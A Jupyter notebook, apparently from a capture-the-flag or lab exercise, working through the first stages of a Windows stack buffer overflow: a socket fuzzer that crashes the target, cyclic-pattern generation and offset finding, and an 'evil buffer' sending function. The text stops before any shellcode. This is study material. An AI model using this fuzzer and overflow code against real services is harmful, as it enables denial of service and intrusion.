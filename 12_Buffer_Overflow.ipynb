{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "41d01cbd-9f82-4925-ba8a-175fa63f1c1f",
   "metadata": {},
   "source": [
    "# Buffer Overflow Basics:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "93e47195-e983-431e-96db-a980442881e4",
   "metadata": {},
   "source": [
    "Crash The Application\n",
    "\n",
    "Find EIP\n",
    "\n",
    "Control ESP\n",
    "\n",
    "Identify Bad Characters\n",
    "\n",
    "Find JMP ESP\n",
    "\n",
    "Generate Shell Code\n",
    "\n",
    "Exploit"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "58afcc77-09ff-40b1-970c-b3ef93aec80e",
   "metadata": {},
   "source": [
    "https://github.com/gh0x0st/Buffer_Overflow"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "669a5c89-3f65-4107-ac64-39d81ce09ab9",
   "metadata": {},
   "source": [
    "# Fuzzing: (Crash App)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "54458e64-34b1-482c-b9ba-8251aabba6fd",
   "metadata": {},
   "source": [
    "ip = \"10.10.8.230\"\n",
    "\n",
    "port = 1337\n",
    "timeout = 5\n",
    "prefix = \"OVERFLOW2 \"Run app in Immunity..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "96ea4a7f-af5e-4b5f-86d5-02e44e46b3ca",
   "metadata": {},
   "outputs": [],
   "source": [
    "ip = \"10.10.65.171\"\n",
    "\n",
    "port = 9999\n",
    "timeout = 5\n",
    "prefix = \"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "96f71cee-7458-43b0-b949-2c120a58e2f0",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fuzzing with 100 bytes\n",
      "Fuzzing with 200 bytes\n",
      "Fuzzing with 300 bytes\n",
      "Fuzzing with 400 bytes\n",
      "Fuzzing with 500 bytes\n",
      "Fuzzing with 600 bytes\n",
      "Fuzzing with 700 bytes\n",
      "Fuzzing with 800 bytes\n",
      "Fuzzing with 900 bytes\n",
      "Fuzzing with 1000 bytes\n",
      "Fuzzing with 1100 bytes\n",
      "Fuzzing with 1200 bytes\n",
      "Fuzzing with 1300 bytes\n",
      "Fuzzing with 1400 bytes\n",
      "Fuzzing with 1500 bytes\n",
      "Fuzzing with 1600 bytes\n",
      "Fuzzing with 1700 bytes\n",
      "Fuzzing with 1800 bytes\n",
      "Fuzzing with 1900 bytes\n",
      "Fuzzing with 2000 bytes\n",
      "Fuzzing with 2100 bytes\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR:root:Internal Python error in the inspect module.\n",
      "Below is the traceback from this internal error.\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fuzzing crashed at 2200 bytes\n",
      "Traceback (most recent call last):\n",
      "  File \"/tmp/ipykernel_2302/1253587491.py\", line 12, in <module>\n",
      "    s.recv(1024)\n",
      "socket.timeout: timed out\n",
      "\n",
      "During handling of the above exception, another exception occurred:\n",
      "\n",
      "Traceback (most recent call last):\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/interactiveshell.py\", line 3441, in run_code\n",
      "    exec(code_obj, self.user_global_ns, self.user_ns)\n",
      "  File \"/tmp/ipykernel_2302/1253587491.py\", line 19, in <module>\n",
      "    sys.exit(0)\n",
      "SystemExit: 0\n",
      "\n",
      "During handling of the above exception, another exception occurred:\n",
      "\n",
      "Traceback (most recent call last):\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\", line 1101, in get_records\n",
      "    return _fixed_getinnerframes(etb, number_of_lines_of_context, tb_offset)\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\", line 248, in wrapped\n",
      "    return f(*args, **kwargs)\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\", line 281, in _fixed_getinnerframes\n",
      "    records = fix_frame_records_filenames(inspect.getinnerframes(etb, context))\n",
      "  File \"/root/miniconda/lib/python3.9/inspect.py\", line 1541, in getinnerframes\n",
      "    frameinfo = (tb.tb_frame,) + getframeinfo(tb, context)\n",
      "AttributeError: 'tuple' object has no attribute 'tb_frame'\n"
     ]
    },
    {
     "ename": "TypeError",
     "evalue": "object of type 'NoneType' has no len()",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mtimeout\u001b[0m                                   Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_2302/1253587491.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     11\u001b[0m             \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mconnect\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mip\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mport\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 12\u001b[0;31m             \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1024\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     13\u001b[0m             \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Fuzzing with {} bytes\"\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstring\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m-\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprefix\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mtimeout\u001b[0m: timed out",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mSystemExit\u001b[0m                                Traceback (most recent call last)",
      "    \u001b[0;31m[... skipping hidden 1 frame]\u001b[0m\n",
      "\u001b[0;32m/tmp/ipykernel_2302/1253587491.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     18\u001b[0m         \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Fuzzing crashed at {} bytes\"\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstring\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m-\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprefix\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 19\u001b[0;31m         \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mexit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     20\u001b[0m     \u001b[0mstring\u001b[0m \u001b[0;34m+=\u001b[0m \u001b[0;36m100\u001b[0m \u001b[0;34m*\u001b[0m \u001b[0;34m\"A\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mSystemExit\u001b[0m: 0",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "    \u001b[0;31m[... skipping hidden 1 frame]\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mshowtraceback\u001b[0;34m(self, exc_tuple, filename, tb_offset, exception_only, running_compiled_code)\u001b[0m\n\u001b[1;32m   2052\u001b[0m                     stb = ['An exception has occurred, use %tb to see '\n\u001b[1;32m   2053\u001b[0m                            'the full traceback.\\n']\n\u001b[0;32m-> 2054\u001b[0;31m                     stb.extend(self.InteractiveTB.get_exception_only(etype,\n\u001b[0m\u001b[1;32m   2055\u001b[0m                                                                      value))\n\u001b[1;32m   2056\u001b[0m                 \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mget_exception_only\u001b[0;34m(self, etype, value)\u001b[0m\n\u001b[1;32m    752\u001b[0m         \u001b[0mvalue\u001b[0m \u001b[0;34m:\u001b[0m \u001b[0mexception\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    753\u001b[0m         \"\"\"\n\u001b[0;32m--> 754\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mListTB\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstructured_traceback\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    755\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    756\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mshow_exception_only\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevalue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, evalue, etb, tb_offset, context)\u001b[0m\n\u001b[1;32m    627\u001b[0m             \u001b[0mchained_exceptions_tb_offset\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    628\u001b[0m             out_list = (\n\u001b[0;32m--> 629\u001b[0;31m                 self.structured_traceback(\n\u001b[0m\u001b[1;32m    630\u001b[0m                     \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0metb\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mchained_exc_ids\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    631\u001b[0m                     chained_exceptions_tb_offset, context)\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, value, tb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1365\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1366\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtb\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtb\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1367\u001b[0;31m         return FormattedTB.structured_traceback(\n\u001b[0m\u001b[1;32m   1368\u001b[0m             self, etype, value, tb, tb_offset, number_of_lines_of_context)\n\u001b[1;32m   1369\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, value, tb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1265\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mmode\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mverbose_modes\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1266\u001b[0m             \u001b[0;31m# Verbose modes need a full traceback\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1267\u001b[0;31m             return VerboseTB.structured_traceback(\n\u001b[0m\u001b[1;32m   1268\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtb\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtb_offset\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mnumber_of_lines_of_context\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1269\u001b[0m             )\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, evalue, etb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1122\u001b[0m         \u001b[0;34m\"\"\"Return a nice text document describing the traceback.\"\"\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1123\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1124\u001b[0;31m         formatted_exception = self.format_exception_as_a_whole(etype, evalue, etb, number_of_lines_of_context,\n\u001b[0m\u001b[1;32m   1125\u001b[0m                                                                tb_offset)\n\u001b[1;32m   1126\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mformat_exception_as_a_whole\u001b[0;34m(self, etype, evalue, etb, number_of_lines_of_context, tb_offset)\u001b[0m\n\u001b[1;32m   1080\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1081\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1082\u001b[0;31m         \u001b[0mlast_unique\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecursion_repeat\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfind_recursion\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0morig_etype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1083\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1084\u001b[0m         \u001b[0mframes\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat_records\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mrecords\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mlast_unique\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecursion_repeat\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mfind_recursion\u001b[0;34m(etype, value, records)\u001b[0m\n\u001b[1;32m    380\u001b[0m     \u001b[0;31m# first frame (from in to out) that looks different.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    381\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0mis_recursion_error\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 382\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    383\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    384\u001b[0m     \u001b[0;31m# Select filename, lineno, func_name to track frames with\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mTypeError\u001b[0m: object of type 'NoneType' has no len()"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/env python3\n",
    "\n",
    "import socket, time, sys\n",
    "\n",
    "string =  \"A\" * 100\n",
    "\n",
    "while True:\n",
    "    try:\n",
    "        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "            s.settimeout(timeout)\n",
    "            s.connect((ip, port))\n",
    "            s.recv(1024)\n",
    "            print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))\n",
    "            s.send(bytes(\"WINDOWS\", \"latin-1\"))\n",
    "            s.send(bytes(string, \"latin-1\"))\n",
    "            s.recv(1024)\n",
    "    except:\n",
    "        print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))\n",
    "        sys.exit(0)\n",
    "    string += 100 * \"A\"\n",
    "    time.sleep(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "3bbc1fd1-67d7-441e-a4b6-97b863fc4ec6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2200"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "crash_size = len(string) - len(prefix)\n",
    "\n",
    "crash_size"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c8fcf8a3-d0e6-48f3-a015-1710f66e831f",
   "metadata": {},
   "source": [
    "Ensure EIP is overwritten with AAAAAAAAA!\n",
    "\n",
    "Mona is Windows specific plugin for Immunity Debugger:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "e3112090-b309-4e87-b8ce-4d564fbf83c2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/bin/bash: mona: command not found\n"
     ]
    }
   ],
   "source": [
    "!mona config -set workingfolder c:\\mona\\%p"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "edf440c5-8dd0-406c-bd07-a5248feaf837",
   "metadata": {},
   "source": [
    "# Crash Replication, Locating EIP:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6288a135-3c2b-407d-98ea-e64524d745fb",
   "metadata": {},
   "source": [
    "#### Payload: Should *sometimes* be 400 bytes longer than pattern that crashed server\n",
    "\n",
    "(Make sure to insert below)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "40842682-09c2-45dc-8104-33a9b86bc9dc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb\n"
     ]
    }
   ],
   "source": [
    "!locate pattern_create.rb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "d6404f95-d299-4352-8f67-122301b39d6d",
   "metadata": {},
   "outputs": [],
   "source": [
    "crash_padding = 400\n",
    "crash_size_padded = crash_size + crash_padding\n",
    "# payload_sl = !/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {crash_size_padded}\n",
    "# payload_sl = !/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l {crash_size_padded}\n",
    "\n",
    "payload_sl = !/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {crash_size}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "7b2c50bb-6c68-4773-ae2a-ea512bfd603e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C'"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payload = payload_sl.s\n",
    "\n",
    "payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "id": "b7fb867c-47bc-43ba-82fe-150126b5f579",
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import time\n",
    "def run_overflow(payload, prefix=\"\", offset=0, retn=\"\", padding=\"\", target=None):\n",
    "    overflow = \"A\" * offset\n",
    "    postfix = \"\"\n",
    "    \n",
    "    if target is None:\n",
    "        target=ip\n",
    "        \n",
    "    buffer = prefix + overflow + retn + padding + payload + postfix\n",
    "\n",
    "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "\n",
    "    try:\n",
    "        s.connect((target, port))\n",
    "        s.recv(1024)\n",
    "        print(\"Sending evil buffer...\")\n",
    "        s.send(bytes(\"WINDOWS\" +\"\\r\\n\", \"latin-1\"))\n",
    "        time.sleep(1)\n",
    "        s.send(bytes(buffer, \"latin-1\"))\n",
    "        print(\"Done!\")\n",
    "    except:\n",
    "        print(\"Could not connect.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "48a66899-d478-4e0e-8dcf-4a5495a227db",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "run_overflow(payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "613d3c83-49c8-4310-a3fa-be4488d6b0a8",
   "metadata": {},
   "source": [
    "Ensure EIP is overwritten successfully, if it isn't and program crashes abnormally, payload may be too long."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "d13f8d5e-43fb-4d74-84fa-207c21f64ccb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!mona findmsp -distance 2200\n"
     ]
    }
   ],
   "source": [
    "!echo !mona findmsp -distance {crash_size_padded}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6cd9a766-978a-4e47-9b42-fa4e54d396be",
   "metadata": {},
   "source": [
    "Alternatively:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "id": "133c3063-ffc9-4d6b-86eb-35d3f494b2d2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Exact match at offset 2012\n"
     ]
    }
   ],
   "source": [
    "# !msf-pattern_offset -l {crash_size} -q <CRASHED EIP>\n",
    "!msf-pattern_offset -l {crash_size} -q 31704330"
   ]
  },
  {
   "cell_type": "markdown",
